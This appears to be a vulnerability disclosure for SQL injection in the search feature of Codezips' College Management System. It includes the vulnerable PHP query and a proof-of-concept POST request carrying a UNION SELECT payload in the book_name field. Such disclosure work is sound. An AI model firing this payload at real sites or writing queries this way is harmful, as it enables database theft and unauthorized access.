# SQL Injection via Search function


## Vendor and Product information:
* **Vendor:** Codezips
* **Product:** College Management System
* **Product URL:** https://codezips.com/php/college-management-system/

## Description
The search book feature in the College Management System application is susceptible to SQL injection. This vulnerability could allow an attacker to extract sensitive server data and gain unauthorized access.

## Code
~~~ php
<?php
if(isset($_POST['search_book']))
 $name=$_POST['book_name'];
 $author=$_POST['book_author'];
 $query = "SELECT * FROM book WHERE book_name = '$name' AND author = '$author'";
 $results = mysqli_query($db, $query);
 $row = mysqli_fetch_array($results);
?>
~~~

## Proof of Concept
**HTTP Request Example**
``` http request
POST /college-mgmt-php-master/Front-end/faculty.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/college-mgmt-php-master/Front-end/faculty.php
Cookie: PHPSESSID=vetltpbc8h9eusf22vbcf34lor
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

book_name=x'+union+select+NULL,version(),NULL,NULL--+-&book_author=x&search_book=
```

## Screenshot
![image](https://github.com/user-attachments/assets/dcad5751-4fe1-4526-a343-2ee8568132eb)

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
